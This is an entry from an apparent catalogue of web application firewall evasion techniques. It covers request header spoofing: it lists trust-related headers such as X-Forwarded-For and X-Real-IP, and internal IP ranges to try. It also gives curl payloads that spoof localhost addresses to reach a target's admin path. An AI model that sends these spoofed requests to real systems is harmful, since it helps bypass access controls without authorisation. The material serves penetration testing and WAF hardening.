---
id: WAF-EVASION-21
title: Request Header Spoofing
category: Evasion Techniques
severity_range: Medium-Critical
owasp_ref: https://github.com/0xInfection/Awesome-WAF
---

# WAF-EVASION-21: Request Header Spoofing

## Summary

WAFs often have relaxed or disabled rules for internal IP addresses, trusted networks, or specific client headers. By spoofing these headers, attackers can bypass WAF restrictions.

## When to Use

- Against WAFs that trust internal IP ranges
- When the WAF is configured to allow certain headers through
- For bypassing geo-restrictions and IP-based rules

## Spoofable Headers

| Header | Purpose |
|--------|---------|
| `X-Originating-IP` | Original client IP (sometimes trusted) |
| `X-Forwarded-For` | Proxy chain IP (can be spoofed) |
| `X-Remote-IP` | Remote client IP |
| `X-Remote-Addr` | Remote address |
| `X-Client-IP` | Client IP header |
| `X-Real-IP` | Real client IP (nginx) |
| `X-Forwarded-Host` | Original host header |
| `X-Forwarded-Proto` | Original protocol |

## Payload Examples

```bash
# Bypass IP restriction via internal IP spoofing
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin/

# Multiple spoof headers
curl -H "X-Originating-IP: 127.0.0.1" \
     -H "X-Forwarded-For: 10.0.0.1" \
     -H "X-Remote-IP: 192.168.1.1" \
     https://target.com/

# Cloud bypass header
curl -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Real-IP: 127.0.0.1" \
     -H "X-Client-IP: 127.0.0.1" \
     https://target.com/
```

## Internal IP Ranges to Try

- `127.0.0.1` (localhost)
- `10.0.0.0/8` (private network)
- `172.16.0.0/12` (private network)
- `192.168.0.0/16` (private network)
- `0.0.0.0` (sometimes accepted)

## Tool

```bash
# enumXFF - X-Forwarded-For IP enumeration for 403 bypass
```

## References

- enumXFF tool
